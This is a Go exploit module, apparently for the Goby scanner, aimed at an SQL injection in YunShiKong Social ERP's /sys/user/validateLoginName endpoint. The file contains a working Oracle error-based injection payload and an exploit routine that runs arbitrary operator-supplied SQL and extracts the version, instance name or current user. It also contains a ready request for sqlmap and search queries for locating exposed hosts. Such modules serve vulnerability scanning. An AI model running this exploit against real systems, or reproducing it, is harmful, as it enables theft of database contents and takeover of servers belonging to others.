package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "YunShiKong Social ERP /sys/user/validateLoginName SQL Injection Vulnerability",
    "Description": "<p>YunShiKong Social ERP is a software for enterprise resource planning management. The /sys/user/validateLoginName interface of this system has an SQL injection vulnerability, allowing attackers to execute malicious SQL statements, obtain sensitive information from the database, and even control the database server.</p>",
    "Product": "YunShiKong-Social-ERP",
    "Homepage": "http://123.161.211.74:8057/home/shikongERP",
    "DisclosureDate": "2024-04-20",
    "PostTime": "2024-11-07",
    "Author": "2987612621@qq.com",
    "FofaQuery": "(body=\"云时空社会化商业ERP系统\" || body=\"yunlogo_home.png\") && title=\"云时空\"",
    "GobyQuery": "(body=\"云时空社会化商业ERP系统\" || body=\"yunlogo_home.png\") && title=\"云时空\"",
    "Level": "2",
    "Impact": "<p>Through the SQL injection vulnerability, attackers can execute malicious SQL statements, obtain sensitive information from the database, and even control the database server.</p>",
    "Recommendation": "<p>1.It is recommended to parameterize SQL queries to avoid directly concatenating user input. </p><p>2.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"http://123.161.211.74:8057/home/shikongERP\">http://123.161.211.74:8057/home/shikongERP</a></p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E4%BA%91%E6%97%B6%E7%A9%BA/%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9FvalidateLoginName%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,sql,sqlPoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "version,instance_name,user",
            "show": "attackType=default"
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select banner from sys.v_$version where rownum=1",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "云时空社会化商业ERP系统 /sys/user/validateLoginName SQL 注入漏洞",
            "Product": "云时空社会化商业ERP系统",
            "Description": "<p>云时空社会化商业ERP系统是一款用于企业资源计划管理的软件。该系统的 /sys/user/validateLoginName 接口存在SQL注入漏洞，攻击者可以通过该漏洞执行恶意SQL语句，获取数据库中的敏感信息，甚至控制数据库服务器。</p>",
            "Recommendation": "<p>1、建议对SQL查询进行参数化处理，避免直接拼接用户输入。</p><p>2、关注官方补丁发布信息，打上补丁或者升级到最新版本&nbsp;</p><p><a href=\"http://123.161.211.74:8057/home/shikongERP\">http://123.161.211.74:8057/home/shikongERP</a><br></p>",
            "Impact": "<p>通过SQL注入漏洞，攻击者可以执行恶意SQL语句，获取数据库中的敏感信息，甚至控制数据库服务器。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "YunShiKong Social ERP /sys/user/validateLoginName SQL Injection Vulnerability",
            "Product": "YunShiKong-Social-ERP",
            "Description": "<p>YunShiKong Social ERP is a software for enterprise resource planning management. The /sys/user/validateLoginName interface of this system has an SQL injection vulnerability, allowing attackers to execute malicious SQL statements, obtain sensitive information from the database, and even control the database server.</p>",
            "Recommendation": "<p>1.It is recommended to parameterize SQL queries to avoid directly concatenating user input.&nbsp;</p><p>2.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"http://123.161.211.74:8057/home/shikongERP\">http://123.161.211.74:8057/home/shikongERP</a><br></p>",
            "Impact": "<p>Through the SQL injection vulnerability, attackers can execute malicious SQL statements, obtain sensitive information from the database, and even control the database server.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

sendPayloaddgksjb := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
  setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
    GetRequest := httpclient.NewGetRequestConfig(urlGet)
    GetRequest.Timeout = 12
    GetRequest.VerifyTls = false
    GetRequest.FollowRedirect = false
    for headName, headValue := range head {
      GetRequest.Header.Store(headName, headValue)
    }
    return httpclient.DoHttpRequest(hostInfo, GetRequest)
  }
  
    //按需求选择自己的发包方式
  
    //---------------------------------------------
    //以下是发包具体内容,这里以POST请求为例
    //---------------------------------------------
    //漏洞的url
    //对url进行编码
    encode_sql := strings.ReplaceAll(sql, " ", "+")
    url := `/sys/user/validateLoginName?loginName=1'+AND+9505=(SELECT+UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(120)||CHR(120)||CHR(113)||(` + encode_sql + `)))+FROM+DUAL)--+mHEd`
    //拼接sql语句
    header := map[string]string{
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    }
    resp, err := setGetRequest(hostInfo, url, header)
    if err != nil {
      return nil, err
    }
    //状态码可自定义,这里默认200
    if resp.StatusCode != 500 {
      return nil, errors.New("not response 500")
    }
    return resp, nil
  }
  
  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      sendPayload := sendPayloaddgksjb
      // 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
      // PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
      // SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
      // SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
      // Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
  
      //检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配
  
      //如果是其他类型的注入,请按照具体情况进行检测
      sql := `select banner from sys.v_$version where rownum=1`
      resp, err := sendPayload(hostInfo, sql)
      if err != nil {
        return false
      }
      if !strings.Contains(resp.Utf8Html, `QName &quot;:`) {
        return false
      }
     if !strings.Contains(resp.Utf8Html, `qpxxq`) {
        return false
      }
      // 拼接SQL注入数据包的请求路径即可
      ss.VulURL = hostInfo.FixedHostInfo + `/sys/user/validateLoginName`
      return true
    },
    func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      sendPayload := sendPayloaddgksjb
      attackType := goutils.B2S(stepLogs.Params["attackType"])
      
      //Switch ExpParams
      //若自己修改ExpParams,请自行修改switch case
      switch attackType {
      case "default":
        panduan := goutils.B2S(stepLogs.Params["default"])
        sql := ""
        if panduan == "version" {
          sql = "SELECT banner FROM sys.v_$version WHERE rownum=1"
        }else if panduan == "instance_name" {
          sql = "select instance_name from V$INSTANCE"
        }else if panduan == "user" {
          sql = "select sys_context('userenv','current_user') from dual"
        }
        
        resp, err := sendPayload(expResult.HostInfo, sql)
        if err != nil && strings.Contains(err.Error(), "not response 500") {
          expResult.Output = `漏洞利用失败:` + err.Error()
          expResult.Success = false
          return expResult
        }
  
        // 正则匹配利用结果,需自己修改
        // 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
        re := regexp.MustCompile(`QName &quot;:qpxxq([^&]+)&`)
        match := re.FindStringSubmatch(resp.Utf8Html)
        if len(match) < 1 {
          //正则失败
          expResult.Output = `Exploitation failed.`
          expResult.Success = false
          return expResult
        }
        expResult.Success = true
  
        expResult.Output = `The key points you need to extract is : ` + match[1]
    fmt.Print(expResult)
        return expResult
      case "sql":
        sql := goutils.B2S(stepLogs.Params["sql"])
        resp, err := sendPayload(expResult.HostInfo, sql)
        if err != nil && strings.Contains(err.Error(), "not response 500") {
          expResult.Output = `漏洞利用失败:` + err.Error()
          expResult.Success = false
          return expResult
        }
  
        // 正则匹配利用结果,需自己修改
        // 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
        re := regexp.MustCompile(`QName &quot;:qpxxq([^&]+)&`)
        match := re.FindStringSubmatch(resp.Utf8Html)
        if len(match) < 1 {
          //正则失败
          expResult.Output = `Exploitation failed.`
          expResult.Success = false
          return expResult
        }
        expResult.Success = true
  
        expResult.Output = `The key points you need to extract is : ` + match[1]
    fmt.Print(expResult)
        return expResult
  
      case "sqlPoint":
        sql := "select banner from sys.v_$version where rownum=1"
        _, err := sendPayload(expResult.HostInfo, sql)
        if err != nil {
          expResult.Output = `Exploitation failed: ` + err.Error()
          expResult.Success = false
          return expResult
        }
        //sqlPoint,给用户跑sqlmap用,需修改对应的参数
        expResult.Success = true
        expResult.Output = `GET /sys/user/validateLoginName?loginName=1'+AND+9505=(SELECT+UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(120)||CHR(120)||CHR(113)||(SELECT+(CASE+WHEN+(9505=9505)+THEN+1+ELSE+0+END)+FROM+DUAL)))+FROM+DUAL)--+mHEd HTTP/1.1
  Host: ` + expResult.HostInfo.HostInfo + `
  User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  `
        return expResult
      //检查ExpParams是否设置正确
      default:
        expResult.Output = `Unknown attack type: ` + attackType
        expResult.Success = false
        return expResult
      }
    },
  ))
  
  }